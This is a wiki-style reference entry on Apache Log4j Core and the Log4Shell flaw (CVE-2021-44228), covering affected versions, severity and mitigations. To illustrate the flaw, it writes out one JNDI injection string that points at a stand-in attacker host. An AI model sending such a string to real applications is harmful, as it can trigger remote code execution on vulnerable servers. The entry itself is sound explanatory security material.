# Apache Log4j Core

## What it is
Think of Log4j Core as the stenographer inside a Java application — dutifully recording everything said in the room, including messages it shouldn't blindly trust. It is the implementation module of the Apache Log4j 2 logging framework, responsible for capturing, formatting, and routing log messages within Java applications. The "Core" artifact contains the engine that processes logging events, distinct from the API layer that developers code against.

## Why it matters
In December 2021, CVE-2021-44228 (Log4Shell) demonstrated that Log4j Core's JNDI lookup feature would fetch and execute remote Java classes when it encountered a specially crafted string like `${jndi:ldap://attacker.com/exploit}` embedded in a logged value — including HTTP User-Agent headers. An attacker sending that string to any vulnerable internet-facing application could achieve unauthenticated Remote Code Execution (RCE), affecting hundreds of millions of systems including iCloud, Steam, and countless enterprise platforms.

## Key facts
- **CVE-2021-44228 (Log4Shell)** carries a CVSS score of **10.0 (Critical)** — the maximum possible severity rating.
- Vulnerable versions span **Log4j Core 2.0-beta9 through 2.14.1**; the fix was introduced in **2.15.0**, with further hardening in 2.16.0 (JNDI disabled by default).
- The attack vector is **network-accessible**, requires **no authentication**, and exploits the JNDI (Java Naming and Directory Interface) message lookup substitution feature.
- Mitigation options include: patching to ≥2.17.1, setting `log4j2.formatMsgNoLookups=true`, or removing the `JndiLookup` class from the JAR via `zip -q -d log4j-core-*.jar org/apache/log4j/core/lookup/JndiLookup.class`.
- Log4Shell is classified under **CWE-917** (Improper Neutralization of Special Elements in an Expression Language Statement).

## Related concepts
[[JNDI Injection]] [[Remote Code Execution]] [[CVE Management]] [[Dependency Scanning]] [[Software Composition Analysis]]